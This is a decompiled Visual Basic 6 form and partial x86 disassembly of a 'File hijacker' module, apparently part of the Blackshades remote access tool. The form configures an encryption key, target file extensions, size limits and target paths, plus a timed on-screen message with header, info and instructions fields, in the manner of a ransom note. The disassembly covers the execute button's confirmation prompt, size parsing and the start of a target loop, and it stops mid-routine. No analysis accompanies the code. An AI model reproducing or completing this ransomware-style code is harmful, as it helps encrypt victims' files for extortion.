VERSION 5.00
Begin VB.Form frmHijacker
  Caption = "File hijacker"
  ScaleMode = 1
  AutoRedraw = False
  FontTransparent = True
  BorderStyle = 3 'Fixed Dialog
  Icon = "frmHijacker.frx":0
  LinkTopic = "Form1"
  MaxButton = 0   'False
  MinButton = 0   'False
  ClientLeft = 45
  ClientTop = 375
  ClientWidth = 12825
  ClientHeight = 8520
  StartUpPosition = 2 'CenterScreen
  Begin VB.Timer tmrSel
    Interval = 500
    Left = 12240
    Top = 0
  End
  Begin XtremeSuiteControls.GroupBox gbHijack
    Index = 1
    Left = 0
    Top = 6720
    Width = 12735
    Height = 1215
    TabIndex = 17
    Begin VB.TextBox txtTimeSec
      Left = 1680
      Top = 840
      Width = 735
      Height = 285
      Text = "3600"
      TabIndex = 28
      MaxLength = 5
    End
    Begin VB.TextBox txtFileSz
      Left = 10320
      Top = 360
      Width = 615
      Height = 285
      Text = "3"
      TabIndex = 24
      MaxLength = 4
    End
    Begin VB.TextBox txtFileExt
      Left = 6960
      Top = 360
      Width = 1215
      Height = 285
      Text = "txt:doc:jpg"
      TabIndex = 21
      MaxLength = 255
    End
    Begin VB.TextBox txtEncKey
      Left = 1680
      Top = 360
      Width = 2415
      Height = 285
      Text = "Blackshades_key"
      TabIndex = 19
      MaxLength = 32
    End
    Begin XtremeSuiteControls.ComboBox cmbSize
      Left = 10980
      Top = 330
      Width = 735
      Height = 315
      TabStop = 0   'False
      TabIndex = 26
    End
    Begin XtremeSuiteControls.ComboBox cmbTarget
      Left = 4080
      Top = 795
      Width = 1695
      Height = 315
      TabStop = 0   'False
      TabIndex = 30
    End
    Begin XtremeSuiteControls.PushButton cmdGenKey
      Left = 4200
      Top = 360
      Width = 975
      Height = 255
      TabIndex = 39
    End
    Begin VB.Label lblCustomPath
      Caption = "N/A"
      Left = 7080
      Top = 840
      Width = 5535
      Height = 255
      TabIndex = 36
    End
    Begin VB.Label lblCustomTarget
      Caption = "Custom path:"
      Left = 6000
      Top = 840
      Width = 975
      Height = 255
      TabIndex = 33
    End
    Begin VB.Label lblHijacker
      Caption = "Target path:"
      Index = 14
      Left = 3000
      Top = 840
      Width = 975
      Height = 255
      TabIndex = 31
      Alignment = 1 'Right Justify
    End
    Begin VB.Label lblHijacker
      Caption = "sec"
      Index = 13
      Left = 2430
      Top = 840
      Width = 495
      Height = 255
      TabIndex = 29
    End
    Begin VB.Label lblHijacker
      Caption = "Display duration:"
      Index = 12
      Left = 360
      Top = 840
      Width = 1215
      Height = 255
      TabIndex = 27
    End
    Begin VB.Label lblHijacker
      Caption = "(0 = Any)"
      Index = 11
      Left = 11880
      Top = 360
      Width = 735
      Height = 255
      TabIndex = 25
    End
    Begin VB.Label lblHijacker
      Caption = "Max file size:"
      Index = 10
      Left = 9240
      Top = 360
      Width = 975
      Height = 255
      TabIndex = 23
      Alignment = 1 'Right Justify
    End
    Begin VB.Label lblHijacker
      Caption = "( * = Any)"
      Index = 9
      Left = 8280
      Top = 360
      Width = 735
      Height = 255
      TabIndex = 22
    End
    Begin VB.Label lblHijacker
      Caption = "File extension(s):"
      Index = 8
      Left = 5640
      Top = 360
      Width = 1215
      Height = 255
      TabIndex = 20
    End
    Begin VB.Label lblHijacker
      Caption = "Encryption key:"
      Index = 7
      Left = 480
      Top = 360
      Width = 1095
      Height = 255
      TabIndex = 18
    End
  End
  Begin XtremeSuiteControls.GroupBox gbHijack
    Index = 0
    Left = 0
    Top = 0
    Width = 12735
    Height = 6615
    TabIndex = 1
    Begin VB.TextBox txtHeader
      Left = 1200
      Top = 240
      Width = 3255
      Height = 525
      TabIndex = 4
      MaxLength = 15
      BeginProperty Font
        Name = "MS Sans Serif"
        Size = 18
        Charset = 0
        Weight = 700
        Underline = 0 'False
        Italic = 0 'False
        Strikethrough = 0 'False
      EndProperty
    End
    Begin VB.TextBox txtInfo
      Left = 1200
      Top = 960
      Width = 9375
      Height = 1935
      TabIndex = 3
      MultiLine = -1  'True
      ScrollBars = 2
      BeginProperty Font
        Name = "MS Sans Serif"
        Size = 12
        Charset = 0
        Weight = 700
        Underline = 0 'False
        Italic = 0 'False
        Strikethrough = 0 'False
      EndProperty
    End
    Begin VB.TextBox txtInstructions
      Left = 1200
      Top = 3120
      Width = 9375
      Height = 2895
      TabIndex = 2
      MultiLine = -1  'True
      ScrollBars = 2
      BeginProperty Font
        Name = "MS Sans Serif"
        Size = 12
        Charset = 0
        Weight = 700
        Underline = 0 'False
        Italic = 0 'False
        Strikethrough = 0 'False
      EndProperty
    End
    Begin XtremeSuiteControls.ComboBox cmbColorHead
      Left = 5880
      Top = 480
      Width = 1215
      Height = 315
      TabStop = 0   'False
      TabIndex = 5
    End
    Begin XtremeSuiteControls.ComboBox cmbColorInfo
      Left = 11280
      Top = 1800
      Width = 1335
      Height = 315
      TabStop = 0   'False
      TabIndex = 6
    End
    Begin XtremeSuiteControls.ComboBox cmbColorIns
      Left = 11280
      Top = 4440
      Width = 1335
      Height = 315
      TabStop = 0   'False
      TabIndex = 7
    End
    Begin XtremeSuiteControls.CheckBox chkBlink
      Left = 4560
      Top = 480
      Width = 615
      Height = 255
      TabIndex = 8
    End
    Begin XtremeSuiteControls.ComboBox cmbColorBack
      Left = 9360
      Top = 6120
      Width = 1215
      Height = 315
      TabStop = 0   'False
      TabIndex = 9
    End
    Begin XtremeSuiteControls.PushButton cmdExample
      Left = 10800
      Top = 6120
      Width = 1815
      Height = 375
      TabIndex = 32
    End
    Begin XtremeSuiteControls.PushButton cmdHelp
      Left = 120
      Top = 6120
      Width = 975
      Height = 375
      TabIndex = 37
    End
    Begin VB.Label lblHijacker
      Caption = "Note: Read the help section if this is the first time!"
      Index = 15
      Left = 1200
      Top = 6200
      Width = 3615
      Height = 255
      TabIndex = 38
    End
    Begin VB.Label lblHijacker
      Caption = "Header:"
      Index = 0
      Left = 360
      Top = 240
      Width = 735
      Height = 255
      TabIndex = 16
      Alignment = 1 'Right Justify
    End
    Begin VB.Label lblHijacker
      Caption = "Info:"
      Index = 1
      Left = 360
      Top = 960
      Width = 735
      Height = 255
      TabIndex = 15
      Alignment = 1 'Right Justify
    End
    Begin VB.Label lblHijacker
      Caption = "Instructions:"
      Index = 2
      Left = 120
      Top = 3120
      Width = 975
      Height = 255
      TabIndex = 14
      Alignment = 1 'Right Justify
    End
    Begin VB.Label lblHijacker
      Caption = "Color:"
      Index = 3
      Left = 5280
      Top = 510
      Width = 495
      Height = 255
      TabIndex = 13
      Alignment = 1 'Right Justify
    End
    Begin VB.Label lblHijacker
      Caption = "Color:"
      Index = 4
      Left = 10680
      Top = 1800
      Width = 495
      Height = 255
      TabIndex = 12
      Alignment = 1 'Right Justify
    End
    Begin VB.Label lblHijacker
      Caption = "Color:"
      Index = 5
      Left = 10680
      Top = 4440
      Width = 495
      Height = 255
      TabIndex = 11
      Alignment = 1 'Right Justify
    End
    Begin VB.Label lblHijacker
      Caption = "Background color:"
      Index = 6
      Left = 7920
      Top = 6165
      Width = 1335
      Height = 255
      TabIndex = 10
    End
  End
  Begin XtremeSuiteControls.PushButton cmdTest
    Left = 120
    Top = 8040
    Width = 1455
    Height = 375
    TabIndex = 0
  End
  Begin XtremeSuiteControls.PushButton cmdExec
    Left = 11280
    Top = 8040
    Width = 1455
    Height = 375
    TabIndex = 34
  End
  Begin XtremeSuiteControls.CheckBox chkCustomize
    Left = 7440
    Top = 8115
    Width = 3735
    Height = 255
    TabIndex = 35
  End
  Begin VB.Label lblTargets
    Caption = "0"
    Left = 3315
    Top = 8160
    Width = 855
    Height = 255
    TabIndex = 41
    BackStyle = 0 'Transparent
  End
  Begin VB.Label lblHijacker
    Caption = "Selected targets:"
    Index = 16
    Left = 1800
    Top = 8160
    Width = 1455
    Height = 255
    TabIndex = 40
    Alignment = 1 'Right Justify
    BackStyle = 0 'Transparent
  End
End

Attribute VB_Name = "frmHijacker"


Private sub cmdExec__854880
00854880: push ebp
00854881: mov ebp, esp
00854883: sub esp, 0000000Ch
00854886: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0085488B: mov eax, fs:[00h]
00854891: push eax
00854892: mov fs:[00000000h], esp
00854899: mov eax, 0000027Ch
0085489E: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008548A3: push ebx
008548A4: push esi
008548A5: push edi
008548A6: mov var_0C, esp
008548A9: mov var_08, 0040C8C0h
008548B0: mov eax, [ebp+08h]
008548B3: and eax, 00000001h
008548B6: mov var_04, eax
008548B9: mov eax, [ebp+08h]
008548BC: and al, FEh
008548BE: mov [ebp+08h], eax
008548C1: mov eax, [ebp+08h]
008548C4: mov eax, [eax]
008548C6: push [ebp+08h]
008548C9: call [eax+04h]
008548CC: mov var_000000C0, 80020004h
008548D6: mov var_000000C8, 0000000Ah
008548E0: mov var_000000B0, 80020004h
008548EA: mov var_000000B8, 0000000Ah
008548F4: mov var_000000A0, 80020004h
008548FE: mov var_000000A8, 0000000Ah
00854908: mov var_00000090, 80020004h
00854912: mov var_00000098, 0000000Ah
0085491C: mov var_80, 80020004h
00854923: mov var_00000088, 0000000Ah
0085492D: mov var_70, 80020004h
00854934: mov var_78, 0000000Ah
0085493B: mov var_00000174, 00455E24h ; In order to continue, please type "YES"
00854945: mov var_0000017C, 00000008h
0085494F: lea edx, var_0000017C
00854955: lea ecx, var_68
00854958: call 004109E2h ; msvbvm60.dll.__vbaVarDup
0085495D: lea eax, var_000000C8
00854963: push eax
00854964: lea eax, var_000000B8
0085496A: push eax
0085496B: lea eax, var_000000A8
00854971: push eax
00854972: lea eax, var_00000098
00854978: push eax
00854979: lea eax, var_00000088
0085497F: push eax
00854980: lea eax, var_78
00854983: push eax
00854984: lea eax, var_68
00854987: push eax
00854988: call 00410994h ; InputBox
0085498D: mov var_000000D0, eax
00854993: mov var_000000D8, 00000008h
0085499D: lea eax, var_000000D8
008549A3: push eax
008549A4: lea eax, var_000000E8
008549AA: push eax
008549AB: call 00410856h ; LCase(arg_1)
008549B0: mov var_000001E4, 00455E78h ; yes
008549BA: mov var_000001EC, 00008008h
008549C4: lea eax, var_000000E8
008549CA: push eax
008549CB: lea eax, var_000001EC
008549D1: push eax
008549D2: lea eax, var_000000F8
008549D8: push eax
008549D9: call 00410766h ; msvbvm60.dll.__vbaVarCmpEq
008549DE: push eax
008549DF: lea eax, var_00000108
008549E5: push eax
008549E6: call 00410C88h ; Not
008549EB: push eax
008549EC: call 00410910h ; msvbvm60.dll.__vbaBoolVarNull
008549F1: mov var_000001F8, ax
008549F8: lea eax, var_000000E8
008549FE: push eax
008549FF: lea eax, var_000000D8
00854A05: push eax
00854A06: lea eax, var_000000C8
00854A0C: push eax
00854A0D: lea eax, var_000000B8
00854A13: push eax
00854A14: lea eax, var_000000A8
00854A1A: push eax
00854A1B: lea eax, var_00000098
00854A21: push eax
00854A22: lea eax, var_00000088
00854A28: push eax
00854A29: lea eax, var_78
00854A2C: push eax
00854A2D: lea eax, var_68
00854A30: push eax
00854A31: push 00000009h
00854A33: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00854A38: add esp, 00000028h
00854A3B: movsx eax, word ptr var_000001F8
00854A42: test eax, eax
00854A44: jz 00854AE1h
00854A4A: mov var_00000090, 80020004h
00854A54: mov var_00000098, 0000000Ah
00854A5E: mov var_80, 80020004h
00854A65: mov var_00000088, 0000000Ah
00854A6F: mov var_70, 80020004h
00854A76: mov var_78, 0000000Ah
00854A7D: mov var_00000174, 00455E84h ; Task aborted by user! (invalid confirmation code)
00854A87: mov var_0000017C, 00000008h
00854A91: lea edx, var_0000017C
00854A97: lea ecx, var_68
00854A9A: call 004109E2h ; msvbvm60.dll.__vbaVarDup
00854A9F: lea eax, var_00000098
00854AA5: push eax
00854AA6: lea eax, var_00000088
00854AAC: push eax
00854AAD: lea eax, var_78
00854AB0: push eax
00854AB1: push 00000030h
00854AB3: lea eax, var_68
00854AB6: push eax
00854AB7: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
00854ABC: lea eax, var_00000098
00854AC2: push eax
00854AC3: lea eax, var_00000088
00854AC9: push eax
00854ACA: lea eax, var_78
00854ACD: push eax
00854ACE: lea eax, var_68
00854AD1: push eax
00854AD2: push 00000004h
00854AD4: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00854AD9: add esp, 00000014h
00854ADC: jmp 00855F0Dh
00854AE1: push 00000000h
00854AE3: push 00000000h
00854AE5: mov eax, [ebp+08h]
00854AE8: mov eax, [eax]
00854AEA: push [ebp+08h]
00854AED: call [eax+00000348h]
00854AF3: push eax
00854AF4: lea eax, var_40
00854AF7: push eax
00854AF8: call 00410A84h ; Set (object)
00854AFD: push eax
00854AFE: lea eax, var_68
00854B01: push eax
00854B02: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00854B07: add esp, 00000010h
00854B0A: push eax
00854B0B: call 00410A90h ; msvbvm60.dll.__vbaI4Var
00854B10: dec eax
00854B11: neg eax
00854B13: sbb eax, eax
00854B15: inc eax
00854B16: neg eax
00854B18: mov var_000001F8, ax
00854B1F: lea ecx, var_40
00854B22: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00854B27: lea ecx, var_68
00854B2A: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
00854B2F: movsx eax, word ptr var_000001F8
00854B36: test eax, eax
00854B38: jz 854B3Fh
00854B3A: or word ptr var_34, FFFFh
00854B3F: push 00000000h
00854B41: push 00000000h
00854B43: mov eax, [ebp+08h]
00854B46: mov eax, [eax]
00854B48: push [ebp+08h]
00854B4B: call [eax+00000330h]
00854B51: push eax
00854B52: lea eax, var_40
00854B55: push eax
00854B56: call 00410A84h ; Set (object)
00854B5B: push eax
00854B5C: lea eax, var_68
00854B5F: push eax
00854B60: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00854B65: add esp, 00000010h
00854B68: push eax
00854B69: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
00854B6E: mov edx, eax
00854B70: lea ecx, var_00000200
00854B76: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00854B7B: lea ecx, var_40
00854B7E: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00854B83: lea ecx, var_68
00854B86: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
00854B8B: push var_00000200
00854B91: push 00447A84h
00854B96: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
00854B9B: test eax, eax
00854B9D: jnz 00854C34h
00854BA3: mov eax, [ebp+08h]
00854BA6: mov eax, [eax]
00854BA8: push [ebp+08h]
00854BAB: call [eax+00000304h]
00854BB1: push eax
00854BB2: lea eax, var_40
00854BB5: push eax
00854BB6: call 00410A84h ; Set (object)
00854BBB: mov var_000001F8, eax
00854BC1: lea eax, var_38
00854BC4: push eax
00854BC5: mov eax, var_000001F8
00854BCB: mov eax, [eax]
00854BCD: push var_000001F8
00854BD3: call [eax+000000A0h]
00854BD9: fclex 
00854BDB: mov var_000001FC, eax
00854BE1: cmp var_000001FC, 00000000h
00854BE8: jnl 854C0Dh
00854BEA: push 000000A0h
00854BEF: push 00440E08h
00854BF4: push var_000001F8
00854BFA: push var_000001FC
00854C00: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00854C05: mov var_00000258, eax
00854C0B: jmp 854C14h
00854C0D: and var_00000258, 00000000h
00854C14: push var_38
00854C17: call 004109DCh ; Val(arg_1)
00854C1C: fstp real8 ptr var_30
00854C1F: lea ecx, var_38
00854C22: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
00854C27: lea ecx, var_40
00854C2A: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00854C2F: jmp 00854E9Ch
00854C34: push var_00000200
00854C3A: push 00455EECh ; KiB
00854C3F: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
00854C44: test eax, eax
00854C46: jnz 00854CEDh
00854C4C: mov eax, [ebp+08h]
00854C4F: mov eax, [eax]
00854C51: push [ebp+08h]
00854C54: call [eax+00000304h]
00854C5A: push eax
00854C5B: lea eax, var_40
00854C5E: push eax
00854C5F: call 00410A84h ; Set (object)
00854C64: mov var_000001F8, eax
00854C6A: lea eax, var_38
00854C6D: push eax
00854C6E: mov eax, var_000001F8
00854C74: mov eax, [eax]
00854C76: push var_000001F8
00854C7C: call [eax+000000A0h]
00854C82: fclex 
00854C84: mov var_000001FC, eax
00854C8A: cmp var_000001FC, 00000000h
00854C91: jnl 854CB6h
00854C93: push 000000A0h
00854C98: push 00440E08h
00854C9D: push var_000001F8
00854CA3: push var_000001FC
00854CA9: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00854CAE: mov var_0000025C, eax
00854CB4: jmp 854CBDh
00854CB6: and var_0000025C, 00000000h
00854CBD: push var_38
00854CC0: call 004109DCh ; Val(arg_1)
00854CC5: fmul real8 ptr [00404D48h]
00854CCB: fstp real8 ptr var_30
00854CCE: fstsw ax
00854CD0: test al, 0Dh
00854CD2: jnz 00856042h
00854CD8: lea ecx, var_38
00854CDB: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
00854CE0: lea ecx, var_40
00854CE3: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00854CE8: jmp 00854E9Ch
00854CED: push var_00000200
00854CF3: push 00455EF8h ; MiB
00854CF8: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
00854CFD: test eax, eax
00854CFF: jnz 00854DC7h
00854D05: mov eax, [ebp+08h]
00854D08: mov eax, [eax]
00854D0A: push [ebp+08h]
00854D0D: call [eax+00000304h]
00854D13: push eax
00854D14: lea eax, var_40
00854D17: push eax
00854D18: call 00410A84h ; Set (object)
00854D1D: mov var_000001F8, eax
00854D23: lea eax, var_38
00854D26: push eax
00854D27: mov eax, var_000001F8
00854D2D: mov eax, [eax]
00854D2F: push var_000001F8
00854D35: call [eax+000000A0h]
00854D3B: fclex 
00854D3D: mov var_000001FC, eax
00854D43: cmp var_000001FC, 00000000h
00854D4A: jnl 854D6Fh
00854D4C: push 000000A0h
00854D51: push 00440E08h
00854D56: push var_000001F8
00854D5C: push var_000001FC
00854D62: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00854D67: mov var_00000260, eax
00854D6D: jmp 854D76h
00854D6F: and var_00000260, 00000000h
00854D76: push var_38
00854D79: call 004109DCh ; Val(arg_1)
00854D7E: fstp real8 ptr var_00000268
00854D84: fld real8 ptr [00401758h]
00854D8A: push ecx
00854D8B: push ecx
00854D8C: fstp real8 ptr [esp]
00854D8F: fld real8 ptr [00404D48h]
00854D95: push ecx
00854D96: push ecx
00854D97: fstp real8 ptr [esp]
00854D9A: call 00410B0Eh ; msvbvm60.dll.__vbaPowerR8
00854D9F: fmul real8 ptr var_00000268
00854DA5: fstp real8 ptr var_30
00854DA8: fstsw ax
00854DAA: test al, 0Dh
00854DAC: jnz 00856042h
00854DB2: lea ecx, var_38
00854DB5: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
00854DBA: lea ecx, var_40
00854DBD: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00854DC2: jmp 00854E9Ch
00854DC7: push var_00000200
00854DCD: push 00455F04h ; GiB
00854DD2: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
00854DD7: test eax, eax
00854DD9: jnz 00854E9Ch
00854DDF: mov eax, [ebp+08h]
00854DE2: mov eax, [eax]
00854DE4: push [ebp+08h]
00854DE7: call [eax+00000304h]
00854DED: push eax
00854DEE: lea eax, var_40
00854DF1: push eax
00854DF2: call 00410A84h ; Set (object)
00854DF7: mov var_000001F8, eax
00854DFD: lea eax, var_38
00854E00: push eax
00854E01: mov eax, var_000001F8
00854E07: mov eax, [eax]
00854E09: push var_000001F8
00854E0F: call [eax+000000A0h]
00854E15: fclex 
00854E17: mov var_000001FC, eax
00854E1D: cmp var_000001FC, 00000000h
00854E24: jnl 854E49h
00854E26: push 000000A0h
00854E2B: push 00440E08h
00854E30: push var_000001F8
00854E36: push var_000001FC
00854E3C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00854E41: mov var_0000026C, eax
00854E47: jmp 854E50h
00854E49: and var_0000026C, 00000000h
00854E50: push var_38
00854E53: call 004109DCh ; Val(arg_1)
00854E58: fstp real8 ptr var_00000274
00854E5E: fld real8 ptr [00405830h]
00854E64: push ecx
00854E65: push ecx
00854E66: fstp real8 ptr [esp]
00854E69: fld real8 ptr [00404D48h]
00854E6F: push ecx
00854E70: push ecx
00854E71: fstp real8 ptr [esp]
00854E74: call 00410B0Eh ; msvbvm60.dll.__vbaPowerR8
00854E79: fmul real8 ptr var_00000274
00854E7F: fstp real8 ptr var_30
00854E82: fstsw ax
00854E84: test al, 0Dh
00854E86: jnz 00856042h
00854E8C: lea ecx, var_38
00854E8F: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
00854E94: lea ecx, var_40
00854E97: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00854E9C: push 00000000h
00854E9E: push 8001000Dh
00854EA3: mov eax, [ebp+08h]
00854EA6: mov eax, [eax]
00854EA8: push [ebp+08h]
00854EAB: call [eax+00000334h]
00854EB1: push eax
00854EB2: lea eax, var_40
00854EB5: push eax
00854EB6: call 00410A84h ; Set (object)
00854EBB: push eax
00854EBC: lea eax, var_68
00854EBF: push eax
00854EC0: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00854EC5: add esp, 00000010h
00854EC8: push eax
00854EC9: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
00854ECE: sub ax, FFFFh
00854ED2: neg ax
00854ED5: sbb eax, eax
00854ED7: inc eax
00854ED8: neg eax
00854EDA: mov var_000001F8, ax
00854EE1: lea ecx, var_40
00854EE4: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00854EE9: lea ecx, var_68
00854EEC: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
00854EF1: movsx eax, word ptr var_000001F8
00854EF8: test eax, eax
00854EFA: jz 854F4Ah
00854EFC: push 00000000h
00854EFE: push 00000000h
00854F00: mov eax, [ebp+08h]
00854F03: mov eax, [eax]
00854F05: push [ebp+08h]
00854F08: call [eax+00000334h]
00854F0E: push eax
00854F0F: lea eax, var_40
00854F12: push eax
00854F13: call 00410A84h ; Set (object)
00854F18: push eax
00854F19: lea eax, var_68
00854F1C: push eax
00854F1D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00854F22: add esp, 00000010h
00854F25: push eax
00854F26: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
00854F2B: mov edx, eax
00854F2D: lea ecx, var_28
00854F30: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00854F35: lea ecx, var_40
00854F38: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00854F3D: lea ecx, var_68
00854F40: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
00854F45: jmp 00854FD8h
00854F4A: mov eax, [ebp+08h]
00854F4D: mov eax, [eax]
00854F4F: push [ebp+08h]
00854F52: call [eax+00000310h]
00854F58: push eax
00854F59: lea eax, var_40
00854F5C: push eax
00854F5D: call 00410A84h ; Set (object)
00854F62: mov var_000001F8, eax
00854F68: lea eax, var_38
00854F6B: push eax
00854F6C: mov eax, var_000001F8
00854F72: mov eax, [eax]
00854F74: push var_000001F8
00854F7A: call [eax+50h]
00854F7D: fclex 
00854F7F: mov var_000001FC, eax
00854F85: cmp var_000001FC, 00000000h
00854F8C: jnl 854FAEh
00854F8E: push 00000050h
00854F90: push 004425E4h
00854F95: push var_000001F8
00854F9B: push var_000001FC
00854FA1: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00854FA6: mov var_00000278, eax
00854FAC: jmp 854FB5h
00854FAE: and var_00000278, 00000000h
00854FB5: mov eax, var_38
00854FB8: mov var_0000024C, eax
00854FBE: and var_38, 00000000h
00854FC2: mov edx, var_0000024C
00854FC8: lea ecx, var_28
00854FCB: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00854FD0: lea ecx, var_40
00854FD3: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00854FD8: cmp word ptr [008F2430h], FFFFh
00854FE0: jnz 0085577Ch
00854FE6: mov var_00000174, 00000001h
00854FF0: mov var_0000017C, 00000002h
00854FFA: cmp [008F2010h], 00000000h
00855001: jnz 85501Eh
00855003: push 008F2010h
00855008: push 00433984h
0085500D: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00855012: mov var_0000027C, 008F2010h
0085501C: jmp 855028h
0085501E: mov var_0000027C, 008F2010h
00855028: push 00000000h
0085502A: push 00000001h
0085502C: push 00440E48h
00855031: push 00000000h
00855033: push 00000018h
00855035: mov eax, var_0000027C
0085503B: mov eax, [eax]
0085503D: mov ecx, var_0000027C
00855043: mov ecx, [ecx]
00855045: mov ecx, [ecx]
00855047: push eax
00855048: call [ecx+0000054Ch]
0085504E: push eax
0085504F: lea eax, var_40
00855052: push eax
00855053: call 00410A84h ; Set (object)
00855058: push eax
00855059: lea eax, var_68
0085505C: push eax
0085505D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00855062: add esp, 00000010h
00855065: push eax
00855066: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0085506B: push eax
0085506C: lea eax, var_44
0085506F: push eax
00855070: call 00410A84h ; Set (object)
00855075: push eax
00855076: lea eax, var_78
00855079: push eax
0085507A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0085507F: add esp, 00000010h
00855082: push eax
00855083: call 00410A90h ; msvbvm60.dll.__vbaI4Var
00855088: mov var_00000184, eax
0085508E: mov var_0000018C, 00000003h
00855098: mov var_00000194, 00000001h
008550A2: mov var_0000019C, 00000002h
008550AC: lea eax, var_0000017C
008550B2: push eax
008550B3: lea eax, var_0000018C
008550B9: push eax
008550BA: lea eax, var_0000019C
008550C0: push eax
008550C1: lea eax, var_00000220
008550C7: push eax
008550C8: lea eax, var_00000210
008550CE: push eax
008550CF: lea eax, var_24
008550D2: push eax
008550D3: call 00410A3Ch ; For
008550D8: mov var_00000250, eax
008550DE: lea eax, var_44
008550E1: push eax
008550E2: lea eax, var_40
008550E5: push eax
008550E6: push 00000002h
008550E8: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008550ED: add esp, 0000000Ch
008550F0: lea eax, var_78
008550F3: push eax
008550F4: lea eax, var_68
008550F7: push eax
008550F8: push 00000002h
008550FA: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008550FF: add esp, 0000000Ch
00855102: jmp 0085576Ah
00855107: lea eax, var_24
0085510A: mov var_00000174, eax
00855110: mov var_0000017C, 0000400Ch
0085511A: cmp [008F2010h], 00000000h
00855121: jnz 85513Eh
00855123: push 008F2010h
00855128: push 00433984h
0085512D: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00855132: mov var_00000280, 008F2010h
0085513C: jmp 855148h
0085513E: mov var_00000280, 008F2010h
00855148: push 00000000h
0085514A: push 00000004h
0085514C: push 00440E58h
00855151: push 00000010h
00855153: pop eax
00855154: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00855159: lea esi, var_0000017C
0085515F: mov edi, esp
00855161: movsd 
00855162: movsd 
00855163: movsd 
00855164: movsd 
00855165: push 00000001h
00855167: push 00000000h
00855169: push 00440E48h
0085516E: push 00000000h
00855170: push 00000018h
00855172: mov eax, var_00000280
00855178: mov eax, [eax]
0085517A: mov ecx, var_00000280
00855180: mov ecx, [ecx]
00855182: mov ecx, [ecx]
00855184: push eax
00855185: call [ecx+0000054Ch]
0085518B: push eax
0085518C: lea eax, var_40
0085518F: push eax
00855190: call 00410A84h ; Set (object)
00855195: push eax
00855196: lea eax, var_68
00855199: push eax
0085519A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0085519F: add esp, 00000010h
008551A2: push eax
008551A3: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008551A8: push eax
008551A9: lea eax, var_44
008551AC: push eax
008551AD: call 00410A84h ; Set (object)
008551B2: push eax
008551B3: lea eax, var_78
008551B6: push eax
008551B7: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008551BC: add esp, 00000020h
008551BF: push eax
008551C0: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008551C5: push eax
008551C6: lea eax, var_48
008551C9: push eax
008551CA: call 00410A84h ; Set (object)
008551CF: push eax
008551D0: lea eax, var_00000088
008551D6: push eax
008551D7: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008551DC: add esp, 00000010h
008551DF: push eax
008551E0: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
008551E5: sub ax, FFFFh
008551E9: neg ax
008551EC: sbb eax, eax
008551EE: inc eax
008551EF: neg eax
008551F1: mov var_000001F8, ax
008551F8: lea eax, var_48
008551FB: push eax
008551FC: lea eax, var_44
008551FF: push eax
00855200: lea eax, var_40
00855203: push eax
00855204: push 00000003h
00855206: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0085520B: add esp, 00000010h
0085520E: lea eax, var_00000088
00855214: push eax
00855215: lea eax, var_78
00855218: push eax
00855219: lea eax, var_68
0085521C: push eax
0085521D: push 00000003h
0085521F: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00855224: add esp, 00000010h
00855227: movsx eax, word ptr var_000001F8
0085522E: test eax, eax
00855230: jz 0085574Dh
00855236: lea eax, var_24
00855239: mov var_00000174, eax
0085523F: mov var_0000017C, 0000400Ch
00855249: cmp [008F2010h], 00000000h
00855250: jnz 85526Dh
00855252: push 008F2010h
00855257: push 00433984h
0085525C: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00855261: mov var_00000284, 008F2010h
0085526B: jmp 855277h
